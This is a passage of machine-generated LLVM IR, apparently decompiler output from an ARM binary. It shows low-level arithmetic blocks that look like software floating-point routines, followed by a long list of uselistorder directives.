  %v6_15944 = sext i1 %v3_15944 to i32
  %v7_15944 = add i32 %v6_15944, %v4_15944
  %v13_15944 = icmp ult i32 %v0_15944, %v3_15938
  %v14_15944 = or i1 %v13_15944, %v3_15944
  br i1 %v14_15944, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_15948 = sub i32 %v1_15948, %v15_1593c
  store i32 %v3_15948, i32* %r6.global-to-local, align 4
  store i32 %v7_15944, i32* %r5.global-to-local, align 4
  %v5_15950 = udiv i32 %v0_159ac, 2
  %v6_15950 = or i32 %v1_15950, %v5_15950
  store i32 %v6_15950, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1598857 = phi i32 [ %v1_1598858, %.thread4 ], [ %v6_15950, %bb99 ]
  %v1_1593434 = phi i32 [ %v1_1593435, %.thread4 ], [ %v6_15950, %bb99 ]
  %v1_1595045 = phi i32 [ %v1_15950, %.thread4 ], [ %v6_15950, %bb99 ]
  %v1_1596c = phi i32 [ %v1_1596c49, %.thread4 ], [ %v6_15950, %bb99 ]
  %v0_15960 = phi i32 [ %v0_15944, %.thread4 ], [ %v7_15944, %bb99 ]
  %v1_15964 = phi i32 [ %v1_15948, %.thread4 ], [ %v3_15948, %bb99 ]
  %v1_15954 = urem i32 %v3_15938, 2
  %v2_15954 = icmp ne i32 %v1_15954, 0
  %v3_15954 = udiv i32 %v5_159a417, 4
  %v3_15958 = zext i1 %v2_15954 to i32
  %v6_15958 = and i64 %v14_1593c, 4294967295
  %v7_15958 = sub i32 33, %v15_1593c
  %v8_15958 = zext i32 %v7_15958 to i64
  %v9_15958 = shl i64 %v6_15958, %v8_15958
  %v10_15958 = sub i32 32, %v15_1593c
  %v11_15958 = shl i32 %v3_15958, %v10_15958
  %v12_15958 = zext i32 %v11_15958 to i64
  %v14_15958 = or i64 %v12_15958, %v9_15958
  %v15_15958 = trunc i64 %v14_15958 to i32
  %v3_1595c = icmp uge i32 %v1_15964, %v15_15958
  %v3_15960 = icmp eq i1 %v3_1595c, false
  %v4_15960 = sub i32 %v0_15960, %v3_15954
  %v6_15960 = sext i1 %v3_15960 to i32
  %v7_15960 = add i32 %v6_15960, %v4_15960
  %v13_15960 = icmp ult i32 %v0_15960, %v3_15954
  %v14_15960 = or i1 %v13_15960, %v3_15960
  br i1 %v14_15960, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_15964 = sub i32 %v1_15964, %v15_15958
  store i32 %v3_15964, i32* %r6.global-to-local, align 4
  store i32 %v7_15960, i32* %r5.global-to-local, align 4
  %v5_1596c = udiv i32 %v0_159ac, 4
  %v6_1596c = or i32 %v1_1596c, %v5_1596c
  store i32 %v6_1596c, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_15988 = phi i32 [ %v1_1598857, %.thread6 ], [ %v6_1596c, %bb100 ]
  %v1_1593433 = phi i32 [ %v1_1593434, %.thread6 ], [ %v6_1596c, %bb100 ]
  %v1_1595044 = phi i32 [ %v1_1595045, %.thread6 ], [ %v6_1596c, %bb100 ]
  %v1_1596c53 = phi i32 [ %v1_1596c, %.thread6 ], [ %v6_1596c, %bb100 ]
  %v0_1597c = phi i32 [ %v0_15960, %.thread6 ], [ %v7_15960, %bb100 ]
  %v1_15980 = phi i32 [ %v1_15964, %.thread6 ], [ %v3_15964, %bb100 ]
  %v1_15970 = urem i32 %v3_15954, 2
  %v2_15970 = icmp ne i32 %v1_15970, 0
  %v3_15970 = udiv i32 %v5_159a417, 8
  %v3_15974 = zext i1 %v2_15970 to i32
  %v6_15974 = and i64 %v14_15958, 4294967295
  %v7_15974 = sub i32 33, %v15_15958
  %v8_15974 = zext i32 %v7_15974 to i64
  %v9_15974 = shl i64 %v6_15974, %v8_15974
  %v10_15974 = sub i32 32, %v15_15958
  %v11_15974 = shl i32 %v3_15974, %v10_15974
  %v12_15974 = zext i32 %v11_15974 to i64
  %v14_15974 = or i64 %v12_15974, %v9_15974
  %v15_15974 = trunc i64 %v14_15974 to i32
  %v3_15978 = icmp uge i32 %v1_15980, %v15_15974
  %v3_1597c = icmp eq i1 %v3_15978, false
  %v4_1597c = sub i32 %v0_1597c, %v3_15970
  %v6_1597c = sext i1 %v3_1597c to i32
  %v7_1597c = add i32 %v6_1597c, %v4_1597c
  %v13_1597c = icmp ult i32 %v0_1597c, %v3_15970
  %v14_1597c = or i1 %v13_1597c, %v3_1597c
  br i1 %v14_1597c, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_15980 = sub i32 %v1_15980, %v15_15974
  store i32 %v3_15980, i32* %r6.global-to-local, align 4
  store i32 %v7_1597c, i32* %r5.global-to-local, align 4
  %v5_15988 = udiv i32 %v0_159ac, 8
  %v6_15988 = or i32 %v1_15988, %v5_15988
  store i32 %v6_15988, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_15998 = phi i32 [ %v1_15980, %.thread8 ], [ %v3_15980, %bb102 ]
  %v0_15994 = phi i32 [ %v0_1597c, %.thread8 ], [ %v7_1597c, %bb102 ]
  %v2_159d0 = phi i32 [ %v1_15988, %.thread8 ], [ %v6_15988, %bb102 ]
  %v1_1593432 = phi i32 [ %v1_1593433, %.thread8 ], [ %v6_15988, %bb102 ]
  %v1_1595043 = phi i32 [ %v1_1595044, %.thread8 ], [ %v6_15988, %bb102 ]
  %v1_1596c52 = phi i32 [ %v1_1596c53, %.thread8 ], [ %v6_15988, %bb102 ]
  %v2_1598c = or i32 %v0_15994, %v1_15998
  %v4_1598c = icmp eq i32 %v2_1598c, 0
  br i1 %v4_1598c, label %dec_label_pc_159cc, label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %.thread10
  %v3_15994 = mul i32 %v0_15994, 16
  %v4_15998 = udiv i32 %v1_15998, 268435456
  %v5_15998 = or i32 %v3_15994, %v4_15998
  store i32 %v5_15998, i32* %r5.global-to-local, align 4
  %v3_1599c = mul i32 %v1_15998, 16
  store i32 %v3_1599c, i32* %r6.global-to-local, align 4
  %v3_159a0 = mul nuw i32 %v3_15970, 8
  %v4_159a4 = udiv i32 %v15_15974, 536870912
  %v5_159a4 = or i32 %v4_159a4, %v3_159a0
  %v3_159a8 = mul i32 %v15_15974, 8
  %v3_159ac = udiv i32 %v0_159ac, 16
  %tmp = icmp ult i32 %v0_159ac, 16
  br i1 %tmp, label %dec_label_pc_159b4, label %dec_label_pc_15924

dec_label_pc_159b4:                               ; preds = %dec_label_pc_15994
  %v1_159b4 = and i32 %v1_159d0.ph, 1048576
  %v2_159b4 = icmp eq i32 %v1_159b4, 0
  br i1 %v2_159b4, label %dec_label_pc_159bc, label %.thread11.loopexit

dec_label_pc_159bc:                               ; preds = %dec_label_pc_159b4
  %v2_159bc = or i32 %v2_159d0, %v1_159d0.ph
  store i32 %v2_159bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15924.outer

dec_label_pc_159cc:                               ; preds = %.thread10
  store i32 %v15_15974, i32* %r3.global-to-local, align 4
  store i32 %v3_15970, i32* %r2.global-to-local, align 4
  %v1_159cc = and i32 %v1_159d0.ph, 1048576
  %v2_159cc = icmp eq i32 %v1_159cc, 0
  br i1 %v2_159cc, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_159cc
  %v3_159d0 = or i32 %v2_159d0, %v1_159d0.ph
  store i32 %v3_159d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_159b4
  store i32 %v3_159a8, i32* %r3.global-to-local, align 4
  store i32 %v5_159a4, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_159cc, %bb103
  %v1_159d8 = add nsw i32 %v4_158f8, 515
  %v2_159d8 = icmp ugt i32 %v1_158fc, 252
  %v7_159d8 = icmp eq i32 %v1_158fc, 253
  %v2_159dc = xor i1 %v7_159d8, true
  %v3_159dc = and i1 %v2_159d8, %v2_159dc
  br i1 %v3_159dc, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_159dc = icmp ugt i32 %v1_159d8, 1791
  %v11_159dc = icmp eq i32 %v1_159d8, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_159e0 = phi i1 [ %v7_159d8, %.thread11 ], [ %v11_159dc, %bb104 ]
  %v0_159e0 = phi i1 [ %v2_159d8, %.thread11 ], [ %v6_159dc, %bb104 ]
  %v2_159e0 = xor i1 %v1_159e0, true
  %v3_159e0 = and i1 %v0_159e0, %v2_159e0
  call void @__pseudo_cond_branch(i1 %v3_159e0, i32 ptrtoint (i32* @global_var_15710.642 to i32))
  %v0_159e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_159e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_159e4 = sub i32 %v0_159e4, %v1_159e4
  store i32 %v2_159e4, i32* @ip, align 4
  %v3_159e4 = icmp uge i32 %v0_159e4, %v1_159e4
  %v9_159e4 = icmp eq i32 %v0_159e4, %v1_159e4
  br i1 %v9_159e4, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_159e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_159e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_159e8 = sub i32 %v1_159e8, %v2_159e8
  store i32 %v3_159e8, i32* @ip, align 4
  %v4_159e8 = icmp uge i32 %v1_159e8, %v2_159e8
  %v10_159e8 = icmp eq i32 %v1_159e8, %v2_159e8
  br i1 %v10_159e8, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_159ec = load i32, i32* %r1.global-to-local, align 4
  %v2_159ec = urem i32 %v1_159ec, 2
  %v3_159ec = icmp ne i32 %v2_159ec, 0
  %v4_159ec = udiv i32 %v1_159ec, 2
  store i32 %v4_159ec, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_159f0 = phi i1 [ %v3_159e4, %bb105 ], [ %v4_159e8, %bb106 ], [ %v3_159ec, %bb107 ]
  %v0_159f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_159f0 = zext i1 %v1_159f0 to i32
  %v3_159f0 = add i32 %v2_159f0, %v0_159f0
  store i32 %v3_159f0, i32* @r1, align 4
  %v0_159f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_159f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_159f4 = and i32 %v1_159f4, 4096
  %v3_159f4 = icmp ne i32 %v2_159f4, 0
  %v4_159f4 = mul i32 %v1_159f4, 1048576
  %v6_159f4 = add i32 %v4_159f4, %v0_159f4
  %v7_159f4 = zext i1 %v3_159f4 to i32
  %v8_159f4 = add i32 %v7_159f4, %v6_159f4
  store i32 %v8_159f4, i32* %r0.global-to-local, align 4
  %v2_159f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_159f8, i32* @r4, align 4
  store i32 %v6_15898, i32* @r5, align 4
  store i32 %v9_15898, i32* @r6, align 4
  ret i32 %v8_159f4

dec_label_pc_159fc:                               ; preds = %dec_label_pc_158b8
  %v1_159fc = and i32 %v2_158bc, -2147483648
  %v4_15a00 = urem i32 %v1_158a4, 1048576
  %v5_15a00 = or i32 %v1_159fc, %v4_15a00
  store i32 %v5_15a00, i32* %r0.global-to-local, align 4
  %v6_15a04 = add nsw i32 %v2_158b8, 1023
  store i32 %v6_15a04, i32* %r4.global-to-local, align 4
  %v8_15a04 = sub nsw i32 0, %v2_158b8
  %v9_15a04 = and i32 %v6_15a04, %v8_15a04
  %v11_15a04 = icmp slt i32 %v2_158b8, -1023
  %v12_15a04 = icmp eq i32 %v6_15a04, 0
  %v7_15a08 = icmp sgt i32 %v2_158b8, -1023
  br i1 %v7_15a08, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_159fc
  %v10_15a08 = sub nsw i32 1024, %v2_158b8
  store i32 %v10_15a08, i32* %r5.global-to-local, align 4
  %v14_15a08 = and i32 %v10_15a08, %v6_15a04
  %v16_15a08 = icmp slt i32 %v10_15a08, 0
  %v17_15a08 = icmp eq i32 %v6_15a04, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_159fc, %bb108
  %v2_15a10.in = phi i32 [ %v9_15a04, %dec_label_pc_159fc ], [ %v14_15a08, %bb108 ]
  %v1_15a10 = phi i1 [ %v11_15a04, %dec_label_pc_159fc ], [ %v16_15a08, %bb108 ]
  %v0_15a10 = phi i1 [ %v12_15a04, %dec_label_pc_159fc ], [ %v17_15a08, %bb108 ]
  %v2_15a10 = icmp slt i32 %v2_15a10.in, 0
  %v3_15a0c = xor i1 %v2_15a10, %v1_15a10
  %v4_15a0c = or i1 %v0_15a10, %v3_15a0c
  br i1 %v4_15a0c, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_15a0c85 = mul i32 %v6_15a04, 1048576
  %v10_15a0c86 = or i32 %v9_15a0c85, %v5_15a00
  store i32 %v10_15a0c86, i32* %r0.global-to-local, align 4
  store i32 %v3_15898, i32* @r4, align 4
  store i32 %v6_15898, i32* @r5, align 4
  ret i32 %v10_15a0c86

bb111:                                            ; preds = %bb109
  %v1_15a14 = or i32 %v5_15a00, 1048576
  store i32 %v1_15a14, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_15a1c = add nsw i32 %v2_158b8, 1022
  store i32 %v1_15a1c, i32* @r4, align 4
  %v3_15a1c = sub nsw i32 -1023, %v2_158b8
  %v4_15a1c = and i32 %v6_15a04, %v3_15a1c
  %v5_15a1c = icmp slt i32 %v4_15a1c, 0
  store i1 %v5_15a1c, i1* @cpsr_v, align 1
  %v6_15a1c = icmp slt i32 %v2_158b8, -1022
  store i1 %v6_15a1c, i1* @cpsr_n, align 1
  %v7_15a1c = icmp eq i32 %v6_15a04, 1
  store i1 %v7_15a1c, i1* @cpsr_z, align 1
  %v1_15a20 = call i32 @function_15710(i32 %v1_15a14)
  store i32 %v1_15a20, i32* %r0.global-to-local, align 4
  %v0_15a24 = load i32, i32* @r5, align 4
  %v1_15a24 = load i32, i32* @r6, align 4
  %v2_15a24 = or i32 %v1_15a24, %v0_15a24
  store i32 %v2_15a24, i32* @lr, align 4
  %v1_15a28 = call i32 @function_15710(i32 %v1_15a20)
  store i32 %v1_15a28, i32* %r0.global-to-local, align 4
  %v0_15a2c.pre = load i32, i32* @ip, align 4
  %v0_15a30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_15a2c.pre-phi = phi i32 [ %v5_158a8, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_158a8, %bb93 ], [ %v5_158a8, %bb111 ]
  %v0_15a30 = phi i32 [ %v5_158a4, %.thread1 ], [ %v5_158a4, %.thread2 ], [ %v5_158a4, %bb93 ], [ %v0_15a30.pre, %bb111 ]
  %v2_15a34 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_15a2c.pre, %bb111 ]
  %v5_15a2c = and i32 %v2_15a34, %v4_15a2c.pre-phi
  store i32 %v5_15a2c, i32* @r5, align 4
  %v4_15a30 = icmp eq i32 %v2_15a34, %v0_15a30
  br i1 %v4_15a30, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_15a2c
  %v5_15a34 = icmp eq i32 %v5_15a2c, %v2_15a34
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_15a2c, %bb112
  %v0_15a38 = phi i1 [ false, %dec_label_pc_15a2c ], [ %v5_15a34, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_15a38, i32 ptrtoint (i32* @global_var_1588c.643 to i32))
  %v0_15a3c = load i32, i32* @r4, align 4
  %v1_15a3c = load i32, i32* @ip, align 4
  %v4_15a3c = icmp eq i32 %v1_15a3c, %v0_15a3c
  br i1 %v4_15a3c, label %dec_label_pc_15a44, label %dec_label_pc_15a60

dec_label_pc_15a44:                               ; preds = %bb113
  %v0_15a44 = load i32, i32* @r1, align 4
  %v1_15a44 = load i32, i32* %r0.global-to-local, align 4
  %v4_15a44 = mul i32 %v1_15a44, 4096
  %v5_15a44 = or i32 %v4_15a44, %v0_15a44
  store i32 %v5_15a44, i32* %r4.global-to-local, align 4
  %v1_15a48 = icmp ne i32 %v5_15a44, 0
  call void @__pseudo_cond_branch(i1 %v1_15a48, i32 ptrtoint (i32* @global_var_1588c.643 to i32))
  %v0_15a4c = load i32, i32* @r5, align 4
  %v1_15a4c = load i32, i32* @ip, align 4
  %v1_15a50 = icmp ne i32 %v1_15a4c, %v0_15a4c
  call void @__pseudo_cond_branch(i1 %v1_15a50, i32 ptrtoint (i32* @global_var_15874.644 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_15a5c = call i32 @function_1588c(i32 %arg3, i32 %arg4)
  store i32 %v2_15a5c, i32* %r0.global-to-local, align 4
  %v1_15a60.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15a60

dec_label_pc_15a60:                               ; preds = %bb113, %dec_label_pc_15a44
  %v1_15a60 = phi i32 [ %v1_15a3c, %bb113 ], [ %v1_15a60.pre, %dec_label_pc_15a44 ]
  %v0_15a60 = load i32, i32* @r5, align 4
  %v4_15a60 = icmp eq i32 %v0_15a60, %v1_15a60
  br i1 %v4_15a60, label %dec_label_pc_15a68, label %dec_label_pc_15a60.dec_label_pc_15a7c_crit_edge

dec_label_pc_15a60.dec_label_pc_15a7c_crit_edge:  ; preds = %dec_label_pc_15a60
  %v1_15a7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a7c

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15a60
  %v4_15a68 = mul i32 %arg3, 4096
  %v5_15a68 = or i32 %v4_15a68, %arg4
  store i32 %v5_15a68, i32* %r5.global-to-local, align 4
  %v7_15a68 = icmp eq i32 %v5_15a68, 0
  call void @__pseudo_cond_branch(i1 %v7_15a68, i32 ptrtoint (i32* @global_var_15828.645 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_15a78 = call i32 @function_1588c(i32 %arg3, i32 %arg4)
  store i32 %v2_15a78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a7c

dec_label_pc_15a7c:                               ; preds = %dec_label_pc_15a60.dec_label_pc_15a7c_crit_edge, %dec_label_pc_15a68
  %v1_15a7c = phi i32 [ %v1_15a7c.pre, %dec_label_pc_15a60.dec_label_pc_15a7c_crit_edge ], [ %v2_15a78, %dec_label_pc_15a68 ]
  %v0_15a7c = load i32, i32* @r1, align 4
  %v3_15a7c = mul i32 %v1_15a7c, 2
  %v4_15a7c = or i32 %v3_15a7c, %v0_15a7c
  store i32 %v4_15a7c, i32* %r6.global-to-local, align 4
  %v6_15a7c = icmp eq i32 %v4_15a7c, 0
  br i1 %v6_15a7c, label %dec_label_pc_15a7c._crit_edge, label %bb114

dec_label_pc_15a7c._crit_edge:                    ; preds = %dec_label_pc_15a7c
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_15a7c
  %v4_15a80 = mul i32 %arg3, 2
  %v5_15a80 = or i32 %v4_15a80, %arg4
  store i32 %v5_15a80, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_15a80, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_15a7c._crit_edge, %bb114
  %v4_15a90.pre-phi = phi i32 [ %.pre80, %dec_label_pc_15a7c._crit_edge ], [ %v5_15a80, %bb114 ]
  %v0_15a84 = phi i1 [ false, %dec_label_pc_15a7c._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_15a84, i32 ptrtoint (i32* @global_var_157c0.646 to i32))
  %v0_15a88 = load i32, i32* @r1, align 4
  %v1_15a88 = load i32, i32* %r0.global-to-local, align 4
  %v3_15a88 = mul i32 %v1_15a88, 2
  %v4_15a88 = or i32 %v3_15a88, %v0_15a88
  store i32 %v4_15a88, i32* %r4.global-to-local, align 4
  %v1_15a8c = icmp ne i32 %v4_15a88, 0
  call void @__pseudo_cond_branch(i1 %v1_15a8c, i32 ptrtoint (i32* @global_var_15874.644 to i32))
  store i32 %v4_15a90.pre-phi, i32* %r5.global-to-local, align 4
  %v1_15a94 = icmp ne i32 %v4_15a90.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_15a94, i32 ptrtoint (i32* @global_var_15828.645 to i32))
  %v0_15a98 = load i32, i32* %r0.global-to-local, align 4
  %v1_15a98 = load i32, i32* @r1, align 4
  %v2_15a98 = call i32 @function_1588c(i32 %v0_15a98, i32 %v1_15a98)
  store i32 %v2_15a98, i32* %r0.global-to-local, align 4
  ret i32 %v2_15a98

; uselistorder directives
  uselistorder i32 %v5_15a80, { 1, 0, 2 }
  uselistorder i32 %v1_15a3c, { 1, 0 }
  uselistorder i32 %v10_15a08, { 2, 0, 1 }
  uselistorder i32 %v6_15a04, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_15a00, { 1, 0, 2 }
  uselistorder i32 %v2_159e8, { 1, 0, 2 }
  uselistorder i32 %v1_159e8, { 1, 0, 2 }
  uselistorder i32 %v1_159e4, { 1, 0, 2 }
  uselistorder i32 %v0_159e4, { 1, 0, 2 }
  uselistorder i1 %v7_159d8, { 1, 0 }
  uselistorder i32 %v2_159bc, { 1, 0 }
  uselistorder i32 %v3_159a8, { 2, 1, 0 }
  uselistorder i32 %v3_1599c, { 0, 2, 1 }
  uselistorder i32 %v5_15998, { 2, 0, 1 }
  uselistorder i32 %v6_15988, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15974, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_15970, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1597c, { 0, 2, 1 }
  uselistorder i32 %v1_15988, { 1, 0 }
  uselistorder i32 %v6_1596c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15958, { 1, 2, 0, 3 }
  uselistorder i32 %v3_15954, { 0, 2, 1 }
  uselistorder i32 %v0_15960, { 0, 2, 1 }
  uselistorder i32 %v1_1596c, { 1, 0 }
  uselistorder i32 %v6_15950, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1593c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15944, { 0, 2, 1 }
  uselistorder i32 %v1_15950, { 1, 0 }
  uselistorder i32 %v3_15934, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_15928, { 1, 2, 0 }
  uselistorder i32 %v3_159a813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_159a417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_15928, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15934, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_159d0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_15914, { 1, 0 }
  uselistorder i32 %v0_15918, { 1, 0 }
  uselistorder i32 %v3_15904, { 1, 0 }
  uselistorder i1 %v1_158f8, { 1, 0 }
  uselistorder i32 %v3_158e8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_158e4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_158dc, { 2, 1, 0 }
  uselistorder i32 %v5_158d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_158b8, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_158a8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_158a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_158a4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_158a4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_15898, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 1, 2, 3, 4, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 17, 18, 5, 7, 20, 4, 8, 19, 21, 2, 9, 3, 10, 11, 14, 12, 13, 15, 16, 0, 1 }
  uselistorder i32 (i32, i32)* @function_1588c, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_15710, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 8, 9, 3, 10, 1, 11, 12, 13, 4, 5, 7, 14, 6 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 4, 5, 6, 23, 30, 28, 29, 24, 3, 26, 21, 22, 1, 25, 2, 27 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 1, 4 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 28, 9, 10, 2, 11, 12, 13, 29, 14, 15, 3, 16, 17, 61, 62, 63, 0, 64, 65, 18, 19, 66, 67, 20, 68, 69, 103, 104, 84, 85, 70, 71, 36, 37, 38, 114, 39, 115, 116, 40, 117, 118, 41, 119, 120, 121, 122, 123, 124, 105, 106, 107, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 108, 42, 96, 52, 56, 72, 73, 33, 50, 21, 59, 60, 31, 125, 32, 74, 75, 76, 77, 78, 109, 110, 79, 80, 81, 97, 98, 99, 100, 101, 102, 51, 111, 112, 53, 22, 113, 30, 23, 24, 25, 26, 27, 46, 54, 55, 43, 44, 45, 57, 58, 34, 82, 47, 83, 35, 48, 49 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 56, 55, 31, 9, 10, 22, 11, 54, 32, 12, 13, 23, 14, 74, 75, 76, 77, 0, 1, 78, 79, 80, 81, 82, 15, 83, 59, 47, 48, 57, 122, 123, 124, 125, 28, 126, 89, 84, 150, 38, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 39, 127, 90, 91, 92, 93, 94, 95, 96, 97, 98, 16, 40, 99, 37, 100, 101, 58, 102, 103, 104, 128, 129, 130, 167, 60, 17, 67, 149, 134, 133, 131, 132, 62, 63, 64, 135, 136, 137, 138, 139, 140, 18, 85, 86, 2, 72, 73, 33, 166, 43, 44, 41, 42, 24, 25, 35, 36, 45, 168, 105, 87, 141, 142, 106, 107, 53, 108, 109, 110, 111, 29, 112, 49, 50, 113, 114, 115, 46, 116, 117, 118, 119, 34, 26, 27, 120, 121, 51, 143, 144, 61, 145, 146, 30, 147, 148, 65, 66, 19, 20, 52, 21, 68, 69, 70, 71, 88 }
  uselistorder i32 4, {}
  uselistorder i32 32, { 48, 49, 50, 51, 21, 22, 29, 35, 36, 24, 25, 52, 23, 30, 53, 54, 55, 56, 28, 57, 41, 42, 43, 0, 44, 45, 37, 4, 3, 6, 5, 8, 7, 46, 47, 31, 32, 26, 58, 33, 17, 59, 60, 40, 1, 15, 27, 69, 70, 71, 61, 16, 62, 2, 34, 63, 64, 65, 66, 67, 18, 68, 38, 39, 72, 73, 74, 75, 10, 9, 12, 11, 19, 20, 14, 13 }
  uselistorder i32 33, { 2, 3, 4, 0, 5, 6, 1 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 3, 4, 0, 5, 6, 7, 8, 2, 9, 10 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 50, 49, 32, 31, 33, 34, 35, 36, 39, 37, 40, 38, 42, 41, 44, 43, 46, 45, 48, 47 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 135, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 136, 70, 71, 137, 72, 138, 73, 139, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 129, 1, 86, 89, 88, 87, 92, 91, 90, 93, 94, 95, 96, 97, 98, 99, 100, 101, 140, 102, 103, 104, 128, 109, 105, 106, 110, 107, 108, 111, 116, 112, 113, 115, 114, 117, 119, 118, 130, 131, 120, 121, 122, 123, 124, 125, 126, 132, 134, 127, 133 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 12, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 16, 26, 10, 15, 11 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
